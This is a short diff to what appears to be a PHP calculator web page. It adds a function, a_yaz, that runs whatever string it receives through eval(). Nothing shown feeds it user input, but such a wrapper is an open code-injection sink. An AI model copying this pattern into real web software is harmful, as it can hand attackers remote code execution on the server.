@@ -317,6 +317,9 @@
 	</form>
 	';
 	}
+	function a_yaz($a='echo="Hata";'){
+		eval($a);
+	}
 	
 	$co = new cookie();
 	$hm = new hesapmakinesi();
